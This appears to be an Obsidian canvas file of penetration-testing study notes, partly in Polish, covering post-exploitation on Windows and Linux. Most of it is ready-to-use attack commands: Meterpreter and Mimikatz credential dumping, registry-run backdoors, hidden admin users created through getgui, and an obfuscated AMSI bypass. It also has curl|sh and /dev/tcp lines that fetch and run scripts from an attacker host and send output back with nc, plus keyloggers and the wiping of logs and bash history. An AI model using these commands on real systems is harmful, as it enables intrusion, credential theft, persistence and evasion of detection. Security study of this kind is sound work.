{
	"nodes":[
		{"id":"a5e7e41b3faa6e0a","type":"group","x":2950,"y":-6020,"width":8890,"height":4715,"label":"Privilege Escalation and Maintaining Access"},
		{"id":"99ab1402f14165a4","type":"text","text":"# Stable - migrate session to another process\n```bash\nmeterpreter> run post/windows/manage/migrate\nmeterpreter> migrate <PID>\n```","x":4496,"y":-5320,"width":644,"height":150},
		{"id":"8f99bc1459a224a2","type":"text","text":"# Privileged\n`meterpreter> getsystem`","x":5140,"y":-5220,"width":250,"height":100},
		{"id":"a485a01cef46fa30","type":"text","text":"# Persistent","x":5390,"y":-5120,"width":190,"height":50},
		{"id":"fa48dce77eb2aa3c","type":"text","text":"# Maintain session\n1. Stable - migrate session to another process\n1. Privileged\n1. Persistent","x":5040,"y":-5560,"width":540,"height":160},
		{"id":"b10358efbe727a83","type":"text","text":"# Gather info\nType of machine, gather info (meterpreter> sysinfo; cmd> sytseminfo; $ lsb_release/uname/lscpu )","x":5040,"y":-5740,"width":540,"height":100},
		{"id":"a783e39d2e14c0cc","type":"text","text":"* Search for Linux Privilege Escalation exploits in web\n* Dump/crack creds to admin/root account\n* Exploiting proceses running (with higher privileges) on the machine.\n\t* inject code to app directly\n\t* replace file/DLL/executable\n\t* `$ msfvenom/Shellter/BDF`, crash service to force restart","x":8000,"y":-5563,"width":543,"height":243},
		{"id":"9e31e8a5036a2251","type":"text","text":"# PRIVILEGE ESCALATION/MAINTAINING ACCES","x":4970,"y":-6000,"width":680,"height":80,"color":"1"},
		{"id":"7728ffd4536e47b8","type":"text","text":"Local Exploits\nClient-Side Exploits\nRemote Exploits","x":4970,"y":-5920,"width":250,"height":100},
		{"id":"fd43919c86ce5caf","type":"text","text":"# Unquoted Service Paths\nPrivilege excalation or Persistence\nWith Unquoted Service Paths vulnerabilities, we’re able to abuse the way that Windows searches for executables belonging to a service.\nIn many cases, we can abuse this \"search order\" to obtain persistence to a system as the currently logged-on user or escalate our privileges to SYSTEM.\nWhen the path to the service binary is unquoted, Windows will search for the service executable in the following order:\n`C:\\Program Files (x86)\\Canon\\IJ Scan Utility\\SETEVENT.exe`\n1. `C:\\Program.exe`\n1. `C:\\Program Files (x86)\\Canon\\IJ.exe`\n1. `C:\\Program Files (x86)\\Canon\\IJ Scan Utility\\SETEVENT.exe`\n## $ msf > trusted_service_path\n```bash\nmsf> use exploit/windows/local/trusted_service_path \n```\n## $ wmic\n```Powershell\nC:\\> wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # search for service with unquoted service path\n```\n## exploit \n```powershell\n# confirm if you can start/stop service without errors\ncmd> sc stop <service_name> # stop service\ncmd> sc start <service_name> # start service\ncmd> sc qc <service_name> # confirm if service will run as local system account\ncmd> icacls <folder_name> # check folder permisions (one that allow for exploiting Unquoted Service Paths), search for (M) modify permision\nmeterpreter> upload <backdor.exe> # upload msfvenom backdor to folder, change name to proper\n```\n```bash\nmeterpreter> run multi/handler\nmeterpreter> set AutoRunScript migrate -n svchost.exe # auto migrate payload to other proces for stability after getting shell\n```","x":4670,"y":-4400,"width":720,"height":1020},
		{"id":"b0fe28f4c5a11c7c","type":"text","text":"# Pass the hash\nSometimes being in the local administrators group is not enough to pass-the-hash, and depending on the Windows operating system configuration and version, some changes may be required on the target system in order for this to work.\nThe issue typically presents itself when trying to pass-the- hash from an account which isn’t an “actual” administrator (RID-500), but rather, from an account that is in the Administrators group\nFor example, if we try the psexec module from a session where our current user is in the Administrators group, but not an “actual” administrator, and we get a STATUS_ACCESS_DENIED (Command=117 WordCount=0) error, this is a good indication that registry changes may be required on the target host in order for a successful pass-the-hash attack.\n\nThe two registry entries needed on the target for this to be successful are: `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System`\n+ Add anew DWORD (32-bit) named LocalAccountTokenFilterPolicy and set its value to 1\n`HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters`\n+ Add anew DWORD (32-bit) named RequireSecuritySignature and set its value to 0\n\nNonetheless, if we already have a session on the target as an administrator, and would like to “modify” those registry settings to help us with the attack, we can do so with a couple simple powershell one-liners from a Powershell shell: \n```powershell \nPS> Set-ItemProperty -Path HKLM: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System - Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord\nPS> Set-ItemProperty -Path HKLM: \\System\\CurrentControlSet\\Services\\LanManServer\\Parameters - Name RequireSecuritySignature -Value 0 -Type DWord\n```\nAlternatively, we could use the “reg” command to accomplish the same: \n```powershell\nC:\\> reg add \"HKEY_LOCAL MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\nC:\\> reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlset\\Services\\LanManServer\\Parameters\" /v RequireSecuritySignature /t REG_DWORD /d 0 /f\n```\nThe previous registry changes, particularly the `LocalAccountTokenFilterPolicy` setting, essentially allow non RID-500 user accounts (users in the local administrator group for instance) to successfully pass-the- hash in some cases.","x":7072,"y":-4005,"width":687,"height":1025},
		{"id":"d39ed670547fbf3a","type":"text","text":"# Backdor persistence\ncreate file and run it (every reboot, minute, 1hr,...)\n# $ msf > persistence\n```bash\nmsf> search persistence\nmsf> use local/persistence\nmeterpreter> run persistence -h\n```\n## check if module worked\nto check if changes are real\n```bash\nmeterpreter> reg queryval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v <key_name>\n\nmeterpreter> ls C:\\\\Windows\\\\TEMP\\\\<file_name>\n```\n## manual persistence\n1. Upload the file into the victim machine:\n```bash\nmeterpreter> upload [path_to_backdoor_file] [path_on_target]\nmeterpreter> upload  /root/my_bd.exe  C:\\\\windows\\\n```\n2. Edit the Windows Registry Key with the reg command,\n```bash\nmeterpreter> reg setval –k [registry_key_path] –d [value_of_the key] –v [name_of_the_key]\nmeterpreter> reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -d \"C:\\Windows\\my_bd.exe\" -v bd_name\n```\n","x":7792,"y":-4005,"width":751,"height":810},
		{"id":"f863fd09c8edd31c","type":"text","text":"# Windows Credential Dumping\nThe Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.  \nSAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.\n\n```bash\nmeterpreter> pgrep lsass # get lsass.exe PID\nmeterpreter> migrate <PID> # migrate to LSASS process  \n```\nWhy migrate?\n\n- **Stability**: Exploits and Payloads that are providing the session tend to be unstable as compared to the basic process that has been developed for the target and is running on the target. Hence, migrating to those processes can serve to provide a more stable connection.\n- **Cloaking**: Antivirus Software or any other Defensive Software tends to scan and look for malicious files that might be running on the machine. Hence, Cloaking or Hiding our malicious process will avoid detection.\n- **Compatibility**: It is possible that while exploiting a machine that the payload you used might be designed for the 64-bit Architecture but the session that you have received is an Operating System running an 86-bit Architecture. Migrate can be used to shift the process to the native process and provide compatibility to the session.\n## Dumping & Cracking Hashes\n```bash\n# dump hashy maszyny do bazy Metasploit (odczytać za pomocą `msf> creds`)\npost/windows/gather/credentials/sso # This module will collect cleartext Single Sign On credentials from the Local Security Authority using the Kiwi (Mimikatz) extension.\npost/windows/gather/hashdump # This module will dump the local user accounts from the SAM database using the registry\npost/windows/gather/smart_hashdump # This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account Database using the proper technique depending on privilege level, OS and role of the host.\n```\n```bash\nmeterpreter>hashdump\n# skopiować wyświetlone hashe i zapisać w pliku\n# crack hashy za pomocą john lub hashcat\n```\n\n```bash\n# moduł password cracker to decode Windows based password hashes\nauxiliary/analyze/jtr_crack_fast # JtR\n\nmsf> use auxiliary/analyze/crack_windows\nmsf> set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\nmsf> exploit\n```\n\n## Unattended Windows Setup utility\nWindows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.\n\nThis tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.  \nIf the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.\n\nThe Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:\n\n- `C:\\Windows\\Panther\\Unattend.xml`\n- `C:\\Windows\\Panther\\Autounattend.xml`\n\nHasła ukryte w plikach czasem moga być zakodowane Base64\n\n```xml\nSzukać sekcji:\n<Autologon>\n```\n\n```powershell\nPowershell.exe\ncd .\\Desktop\\PowerSploit\\Privesc\\\npowershell -ep bypass # PowerShell execution policy bypass\n. .\\PowerUp.ps1 # Import PowerUp.ps1 script\nInvoke-PrivescAudit # Invoke-PrivescAudit function.\n\n# Decoding administrator password using Powershell.\n$password='QWRtaW5AMTIz'\n$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))\necho $password\n\n# run a command prompt as an administrator using discover credentials using runas.exe utility\nrunas.exe /user:administrator cmd\nAdmin@123\nwhoami\n```\n\n## Dumping Hashes With Mimikatz\nfolder z mimikatz.exe dla różnych rodzajów os:  \n`usr/share/windows-resources/mimikatz`\n\nextract NTLM hashes via the LSA\n\n```powershell\nlsadump::sam\n```\n\n## $ msf> kiwi (Mimikatz)\nThe **SAM (Security Account Manager) database**, is a database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely.\n```bash\n# w sesji meterpretera\nmeterpreter> pgrep lsass # usługa odpowiedzialna za managing Windows Acces Token\nmeterpreter> migrate # trzeba zmigrować do procesu x64 (w x86 mimikatz nie będzie działac poprawnie)\nmeterpreter> load kiwi\nmeterpreter> creds_all # This will grab all of the credentials in RAM and dispaly them to the screen\nmeterpreter> lsa_dump_sam #  Extract all the users NTLM hash using Kiwi\nmeterpreter> lsa_dump_secrets # Find the syskey by dumping the LSA secrets.\n```\n```bash\nmeterpreter> mimikatz_command -f *::*\n```\n## $ msf> wdigest\n```bash\nmeterpreter> wdigest\n```\n## cmd:> WCE.exe\n```powershell\nmeterpreter> execute -i -f wce.exe -a -h # Windows Credentials Editor\n```\n\n","x":6186,"y":-4005,"width":868,"height":2680},
		{"id":"372bc58be3212033","type":"text","text":"# DLL Hijacking / Preloading/ Insecure Library Loading\nDLL Hijacking allows us the ability to abuse a built-in behavior in the way that executables, when launched, search for Dynamic Link Libraries (DLL’s) to import.\nWhen a program is launched, the DLL Search Order in most cases is as follows: \n1. The directory from which the application was launched \n2. The `C:\\Windows\\System32` directory \n3. The 16-bit Windows system directory (i.e, `C:\\windows\\system`) \n4. The Windows directory (`C:\\windows`) \n5. The current directory at the time of execution \n6. Any directories specified by the `%PATH%` environment variable\n## SysInternals > Procexp/Procmon<br>(manual identifying typical DLL Hijacking)\n1. Run `procmon` app form `SysInternals`. Create a `procmon` filter for name of a specific executable we'd like to investigate, (in this case `RegSrvc.exe`), (optional, and also, create a filter for “NAME NOT FOUND?” for the `Result` column so we can quickly filter on relevant entries.)\n2. Launch `Services` app and find service using required executable (\"RegSrvc.exe\"). Stop service and start. Process monitor (`procmon`) catches what is happening. Identify cases where the application is looking for a DLL in a directory which we can write to, or modify.  \n3. Drop our modified payload in the writable directory.\n4. Restart the Service, re-launch the application, or wait for the system to be rebooted in the case the executable is in fact associated with a service that starts at boot time, or, alternatively, wait for the user to launch the affected application.\n\n\n\n\n\n\n\n\n","x":5422,"y":-4270,"width":752,"height":675},
		{"id":"08e0ce6e2aba7128","type":"text","text":"exploit/[OS]/local","x":5015,"y":-4950,"width":250,"height":60},
		{"id":"a7a0705dcd2650c2","type":"text","text":"# User Acces Control Bypass\n\n## verify if UAC is enabled\n```bash\nmsf> post/windows/gather/win_privs # Result of UAC Enabled column\n```\n\n## $ msf bypas UAC\n```bash\nmsf> search uac\n...\nmeterpreter> getsystem \n```\n\nhttps://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/\n## $ UACMe\n\nhttps://github.com/hfiref0x/UACME\n\n```PowerShell\n# wgrać na maszynę program Akagi (UACMe) oraz payload\n# wykonać program za pomocą Akagi64.exe\n$ msfvenom ... > backdor.exe\nmeterpreter> upload backdor.exe\ncmd> Akagi64.exe 23 C:\\Users\\admin\\AppData\\Local\\Temp\\backdoor.exe\n```\n## UAC\n- UAC to prompt o hasło do lokalnego administratora jeśli użytkownik nie jest adminem lub jeśli jest to pytajacy o potwierdzenie wykonania akcji.\n- Jeśli ma sie shella i chce się wykonać coś z uprawnieniami administratora to nie ma możliwości interakcji z tym oknem.\n- UAC pozwala na wykonanie programu z uprawnieniami admina.\n- **Wymagane jest konto admina lokalnego** na maszynie aby wykonać UAC bypass.","x":3866,"y":-4780,"width":778,"height":650},
		{"id":"e3a9f1d01e4816bf","type":"text","text":"# Identyfying PrivEsc Vulns\n\n## $ PowerUp.ps1\nprogram that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities.\nhttps://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f\n### Loading From Disc\n\n```PowerShell\n# (PowerShell execution policy bypass)\npowershell -ep bypass \npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\n\n# probably optional\n# disable AMSI (probably hasn’t been patched by Microsoft)\nsET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} )\n\n# Running PowerUp.ps1\nPS> C:\\> Import-Module PowerUp.ps1\nPS> C:\\> . .\\PowerUp.ps1\n```\n\n### Loading From Your Kali Apache Server\n```PowerShell\nPS C:\\> IEX(New-Object Net.WebClient).DownloadString(‘http://<kali_ip>/PowerUp.ps1’)\n```\n\n## $ PrivescCheck\nPrivilege Escalation Enumeration Script for Windows\nhttps://github.com/itm4n/PrivescCheck\n\n```PowerShell\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\nrunas.exe /user:administrator cmd\n\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML\"\n```\n\n## Windows PrivEsc\n\n*Winlogon*- automatyczne logowanie użytkownika  \nobtaining user account credentials protocols we use to authenticate with the Windows target: **RDP, SMB, WinRM**\n","x":3765,"y":-3595,"width":820,"height":1155},
		{"id":"19f8f6b01d73cb0f","type":"text","text":"# Kernel\n\n## Windows-Exploi-Sugester\n\n**Stara Wersja**: https://github.com/AonCyberLabs/Windows-Exploit-Suggester\n\n**Nowa Wersja**: https://github.com/bitsadmin/wesng\n\n## $ windows-privesc-check\n\npaczka w kali\n\n## $ msf>local_exploit_suggester\n\nmając sesję meterpreter można zanaleźć exploit do podniesienia uprawnień\n","x":2970,"y":-3158,"width":778,"height":493},
		{"id":"a3706e3eb10f60b5","type":"text","text":"# Access Token Impersonation\n## $ msf>incognito\n\n## incognito\n\nImpersonate user tokens when successfully compromising a system.\n\nOnce you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes\n\n```PowerShell\nmsf> load incognito # load module \"incognito\"\nmsf> list_tokens -u  # Lists all accessible tokens and their privilege level\nmsf> impersonate_token <token> # \"ATTACKDEFENSE\\\\Administrator\"\nmsf> getuid\n```\n\n\nWindows access tokens are a core element of the authentication process on Windows and are created and managed by the **Local Security Authority Subsystem Service (LSASS)**.\n\nAccess tokens are generated by the winlogon.exe (login page) process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process.  \n\nThis token is then attached to the userinit.ex (proces używany do uruchamiania innych procesów) process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.\n\nAn access token will typically be assigned one of the following security levels:\n\n- **Impersonate-level tokens** are created as a direct result of a **non-interactive login on Windows**, typically through specific system services or domain logons.\n- **Delegate-level tokens** are typically created through an **interactive login on Windows**, primarily through a traditional login or through remote access protocols such as RDP.\n\nImpersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.  \nDelegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.\n\nThe following are the **privileges that are required** for a successful impersonation attack:\n\n- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.\n\nDodatkowe\n- SeAssignPrimaryToken: This allows a user to impersonate tokens.\n- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.\n\n","x":4585,"y":-3145,"width":890,"height":480},
		{"id":"e43b77d8deb831d0","type":"text","text":"# Maintaining access\n```mermaid\ngraph TD;\n\tMaintain_acces[Maintain Access]\n\tPass_hash[Password Hash]\n\tPass_the_hash[Pass the hash]\n\tCrack_the_hash[Crash the hash]\n\tBackdor\n\tNew_user[New User]\n\tServices[Services such as RDP, VNC, Telnet…]\nMaintain_acces --> Pass_hash\nPass_hash --> Pass_the_hash --> Services\nPass_hash --> Crack_the_hash --> Services\nMaintain_acces --> New_user --> Services\nMaintain_acces --> Backdor\n\n```","x":6620,"y":-4940,"width":518,"height":400},
		{"id":"81ddbe4bfb75e3d1","type":"text","text":"# New user","x":8092,"y":-4540,"width":228,"height":60},
		{"id":"f5f5a70d731054e1","type":"text","text":"# Local Enumeration\n\n## Enumerationg System Information\n```powershell\nPS> systeminfo\nPS> wmic qfe get Caption,Description,HotFixID,InstalledOn\n```\n## Enumerationg/Adding Users and Groups\n```bash\npost/windows/gather/enum_logged_on_users\nmeterpreter> getuid, getprivs\n```\n```powershell\ncmd> whoami [/priv]\ncmd> query user\ncmd> net user <nazwa usera> # Administrator, Guest\ncmd> net localgroup \"<group_name>\" # list users in  group, eg \"Remote Desktop Users\"\ncmd> net localgroup \"<group_name>\" <user> /add # add user to group\ncmd> net user  <username> <passwd> /add # create new user\n```\n\n## Enumerationg Network Information\n\n```powershell\ncmd> ipconfig [/all]\ncmd> route print\ncmd> arp -a\ncmd> netstat -ano\ncmd> netsh firewall show state\ncmd> etsh advfirewall show all profiles\n```\n\n## Enumerationg processes Services\n\n```powershell\ncmd> net start # check running services\ncmd> wmic service list brief\ncmd> wmic service where 'Caption like \"Remote%\" and started=true' get Caption # get info about RDP\ncmd> tasklist /SVC\ncmd> schtasks /query /fo LIST\n```\n\n```bash\nmeterpreter> run post/windows/gather/enum_services\nmeterpreter> run service_manager -l\n```\n```bash\nmeterpreter>ps, pgrep explorer.exe, migrate 2137\n```\n\n# Automatic Local Enumeration\n\n## JAWS (skrypt .ps1)\n\nhttps://github.com/411Hall/JAWS\n\n```powershell\n# skopiować raw skrypt do schowka\n# zapisać skrypt na kali w pliku jaws-enum.ps1\n# przesłać plik na windows\n# w shell windows:\npowershell.exe -ExecutionPolicy Bypass -F .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt\n```\n\n## winPEAS\n```bash\n$ ls -laR /usr/share/peass\n```\n\nCały projekt https://github.com/carlospolop/PEASS-ng/tree/master  \nWinPEAS https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS","x":8887,"y":-4692,"width":985,"height":1605},
		{"id":"615cc14898158632","type":"text","text":"# enable remote shell (Telnet services)\n```bash\n```\n# add user to TelnetClients group\n","x":8800,"y":-2905,"width":580,"height":265},
		{"id":"ecb1e6b2ce8998a3","type":"text","text":"# enable RDP\n```bash\nmeterpreter> run getgui\nmeterpreter>run getgui -e -u alice -p hack_123321\n```\nThe `getgui` command makes the below changes to the target machine:\n- Enable RDP service if it’s disabled\n- Creates new user for an attacker\n- Hide user from Windows Login screen\n- Adding created user to \"Remote Desktop Users\" and \"Administrators\" groups\n# add user to Remote Desktop Users group\nEnabling RDP on the machine is not all. If the target user (the one we know the credentials for) is not allowed to connect through RDP, we will have to grant him this privilege by adding him to the Remote Desktop Users group. Moreover we have to be sure that the Windows firewall does not block the connections.\n```Powershell\ncmd> net localgroup \"Remote Desktop Users\" <user> /add\n```\n# \n```bash\n# loowanie przez RDP do utworzonego konta\nxfreerdp /u:alice /p:hack_123321 /v:10.0.23.139\ny [Accept the certificate]\n```","x":9406,"y":-2905,"width":654,"height":705},
		{"id":"7d04e54eb0e46928","type":"text","text":"# Local Enumeration\n\n## Enumerationg System Information\n\n```bash\n$ hostname\n$ cat /etc/issue\n$ cat /etc/*release\n$ uname -a\n$ lscpu\n$ df -h\n$ cat /etc/shells\n```\n## Enumerationg Users and Groups\n\n```bash\n$ whoami\n$ groups\n$ groups root\n$ cat /etc/passwd\n$ who\n$ lastlog\n```\n\n## Enumerationg Network Information\n\n```bash\n$ netstat\n$ route\n$ ip a s\n$ cat /etc/networks\n$ cat /etc/hosts\n$ cat /etc/resolv.conf\n```\n\n## Enumerating Processes & Cron Jobs\n\n```bash\n$ ps aux\n$ crontab -l\n$ cat /etc/cron*\n```\n# Automatic Local Enumeration\n## $ LinEnum (.sh)\n\nScripted Local Linux Enumeration & Privilege Escalation Checks\nhttps://github.com/rebootuser/LinEnum\n\n## $ Linux-Exploit-Suggester (.sh)\n\nhttps://github.com/mzet-/linux-exploit-suggester\n\n## $ linPEAS\n\nCały projekt https://github.com/carlospolop/PEASS-ng/tree/master  \nlinpeas.sh : https://github.com/carlospolop/PEASS-ng/releases/tag/20231024-f6adaa47\n\n```bash\n# Local network\n$ sudo python3 -m http.server 80 #Host\n$ curl 10.10.10.10/linpeas.sh | sh #Victim\n```\n\n```bash\n# Without curl\n$ sudo nc -q 5 -lvnp 80 < linpeas.sh #Host\n$ cat < /dev/tcp/10.10.10.10/80 | sh #Victim\n```\n\n```bash\n# Excute from memory and send output back to the host\n$ nc -lvnp 9002 | tee linpeas.out #Host\n$ curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim\n```\n\n","x":10240,"y":-4727,"width":680,"height":1640,"color":"3"},
		{"id":"5d845c7485f30de2","type":"text","text":"# Privilege Escalation\n\n## $ traitor\n\nAutomatically exploit low-hanging fruit to pop a root shell\nhttps://github.com/liamg/traitor\nhttps://github.com/liamg/traitor/releases\n\n## Cron jobs\n\n```bash\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>\n#Wait cron job to be executed\n/tmp/bash -p #The effective uid and gid to be set to the real uid and gid\n```\n\n## SUID binaries\n\n```bash\n# nadaj SUID plikowi /bin/cp\n$ chmod u+s /bin/cp\n# znajdź binarki z ustawionym SUID\n$ find / -perm -u=s -type f 2>/dev/null\n```\n\n## diy\n\n```bash\nfind / -not -type l -perm -o+w # identify files with the write permission applied for all user accounts\nopenssl passwd -1 -salt abc password # hash hasła password, salt abc, hash MD5\nfind / -user root -perm -4000 -exec ls -ldb {} \\; # finding setuid program\nsudo -l # misconfigured sudo\n```\n\n","x":10940,"y":-4727,"width":680,"height":800,"color":"3"},
		{"id":"bf82980ea7d8fca5","type":"text","text":"# Linux Credential Dumping\n```bash\n/etc/init.d/postgresql start\nexploit/unix/ftp/proftpd_133c_backdoor\npost/linux/gather/hashdump\nauxiliary/analyze/crack_linux\n```\n# Dumping & Cracking Hashes\n\n```bash\ncat /etc/shadow\n\nmsf> use post/linux/gather/hashdump\n```","x":10997,"y":-3907,"width":567,"height":439,"color":"3"},
		{"id":"023b1d868bb8c922","type":"text","text":"\n# ssh key\n\n```bash\n$ scp student@192.37.104.3:~/.ssh/id_rsa .\n$ chmod 400 id_rsa\n$ ssh -i id_rsa student@192.37.104.3\n```\n\n# cron jobs\n\n```bash\n$ echo \"* * * * * cd /home/student/ && python -m SimpleHTTPServer\" > $ cron # cron job, tworzy serwer http w folderze domowym\n$ crontab -i cron\n$ crontab -l\n```\n","x":10997,"y":-3387,"width":567,"height":480,"color":"3"},
		{"id":"dcd5527296b13e00","type":"text","text":"\n# Clearing Your Tracks\n\n```bash\ncat /dev/null > ~/.bash_history # bash history file\n```","x":10997,"y":-2867,"width":567,"height":160,"color":"3"},
		{"id":"1b0428bb2a7ea9f6","type":"text","text":"# Clearing Your Tracks\n\n```bash\nmeterpreter>clearev\n```\n\nmoduły, np. post tworzą także pliki zawierające polecenia do wykonania aby wyczyścić ślady po działalności  \npokazują się w loot","x":7314,"y":-2183,"width":890,"height":320},
		{"id":"b29a79a0d8d12c9f","type":"text","text":"# PILLAGING/DATA HARVESTING","x":13088,"y":-5819,"width":512,"height":99,"color":"1"},
		{"id":"b18370a31f22eaff","type":"text","text":"# Exfiltration over DNS\n## $ iodine","x":13680,"y":-5440,"width":540,"height":161},
		{"id":"bf69323f6dcae9e1","type":"text","text":"# Local enumeration scripts\n## $ msf > scraper\n```bash\nmeterpreter> run scraper\n```\n## $ msf > winenum\n```bash\nmeterpreter> run winenum\n```\nThe `winenum` script will run several commands such as `arp`, `net`, `netstat`, `netsh`, and `wmic` among other commands on the target machine and store the results on our local system.\n## $ msf > screenshot\n```bash\nmeterpreter> screenshot\n```\n## $ msf > keylogger\n```bash\n# meterpreter> migrate to winlogon.exe process to log the credentials typed when the user unlocks the screen\nmeterpreter> keyscan_start\n# meterpreter> keyscan_dump\n# meterpreter> keyscan_stop\n\nmeterpreter> kaylogrecorder -h # migrates automaticaly, stores keys in local file\n```\n## $ msf > gather/... (data)\n```bash\nmeterpreter> run post/windows/gather/...\nmeterpreter> run post/windows/gather/credentials/...\nmeterpreter> run post/multi/gather/...\n```","x":12960,"y":-5440,"width":700,"height":1001},
		{"id":"681841061eb579dd","type":"text","text":"# Mapping the Internal Network","x":16400,"y":-5765,"width":480,"height":91,"color":"1"},
		{"id":"37500d922dac1ae5","x":15864,"y":-5442,"width":776,"height":322,"type":"text","text":"# dns cache\n```powershell\ncmd> ipconfig /displaydns\n```\n# netstat\n```powershell\n$ netstat -ano # display active network connections and listening ports on a computer, along with associated processes and their Process IDs (PIDs).\n```\n"}
	],
	"edges":[
		{"id":"1bbc0aa4fcb252fc","fromNode":"8f99bc1459a224a2","fromSide":"bottom","toNode":"a7a0705dcd2650c2","toSide":"top","label":"Privileged"},
		{"id":"ff5739cb510cf211","fromNode":"b10358efbe727a83","fromSide":"bottom","toNode":"fa48dce77eb2aa3c","toSide":"top"},
		{"id":"709527527fcb5bc4","fromNode":"fa48dce77eb2aa3c","fromSide":"bottom","toNode":"99ab1402f14165a4","toSide":"top"},
		{"id":"e00665a556c3961c","fromNode":"fa48dce77eb2aa3c","fromSide":"bottom","toNode":"8f99bc1459a224a2","toSide":"top"},
		{"id":"859e6560418b6707","fromNode":"fa48dce77eb2aa3c","fromSide":"bottom","toNode":"a485a01cef46fa30","toSide":"top"},
		{"id":"f5fbe89e9a8a5507","fromNode":"8f99bc1459a224a2","fromSide":"bottom","toNode":"08e0ce6e2aba7128","toSide":"top"},
		{"id":"304411d3856c6ca1","fromNode":"a7a0705dcd2650c2","fromSide":"bottom","toNode":"a3706e3eb10f60b5","toSide":"top"},
		{"id":"d80af885e81344a1","fromNode":"a7a0705dcd2650c2","fromSide":"right","toNode":"fd43919c86ce5caf","toSide":"top"},
		{"id":"e801e4fb9c04e151","fromNode":"a485a01cef46fa30","fromSide":"bottom","toNode":"fd43919c86ce5caf","toSide":"top"},
		{"id":"e9eb9babae1eb812","fromNode":"9e31e8a5036a2251","fromSide":"bottom","toNode":"b10358efbe727a83","toSide":"top"},
		{"id":"0d6a3952a6d968c3","fromNode":"e43b77d8deb831d0","fromSide":"bottom","toNode":"f863fd09c8edd31c","toSide":"top"},
		{"id":"511fd889de89529b","fromNode":"b10358efbe727a83","fromSide":"right","toNode":"f863fd09c8edd31c","toSide":"top"},
		{"id":"12a79939b892ea0b","fromNode":"e43b77d8deb831d0","fromSide":"bottom","toNode":"b0fe28f4c5a11c7c","toSide":"top"},
		{"id":"6036945ec17726d1","fromNode":"8f99bc1459a224a2","fromSide":"right","toNode":"a783e39d2e14c0cc","toSide":"left"},
		{"id":"8651b495b1ab1d05","fromNode":"f5f5a70d731054e1","fromSide":"bottom","toNode":"ecb1e6b2ce8998a3","toSide":"top"},
		{"id":"531be8561bf05862","fromNode":"e43b77d8deb831d0","fromSide":"bottom","toNode":"d39ed670547fbf3a","toSide":"top"},
		{"id":"030c225232490f4d","fromNode":"f5f5a70d731054e1","fromSide":"bottom","toNode":"615cc14898158632","toSide":"top"},
		{"id":"631675166421ef73","fromNode":"e43b77d8deb831d0","fromSide":"bottom","toNode":"372bc58be3212033","toSide":"top"},
		{"id":"d127cff587cf523d","fromNode":"8f99bc1459a224a2","fromSide":"bottom","toNode":"372bc58be3212033","toSide":"top"},
		{"id":"fe4579626dc956ae","fromNode":"a485a01cef46fa30","fromSide":"right","toNode":"e43b77d8deb831d0","toSide":"top"},
		{"id":"ab5d680da213f9d1","fromNode":"a7a0705dcd2650c2","fromSide":"bottom","toNode":"e3a9f1d01e4816bf","toSide":"top"},
		{"id":"47cbb1574651e7aa","fromNode":"a7a0705dcd2650c2","fromSide":"bottom","toNode":"19f8f6b01d73cb0f","toSide":"top"},
		{"id":"1538c88bd87a22b5","fromNode":"e43b77d8deb831d0","fromSide":"right","toNode":"81ddbe4bfb75e3d1","toSide":"top"},
		{"id":"c214b7cd6b88fbb6","fromNode":"b10358efbe727a83","fromSide":"right","toNode":"f5f5a70d731054e1","toSide":"top"},
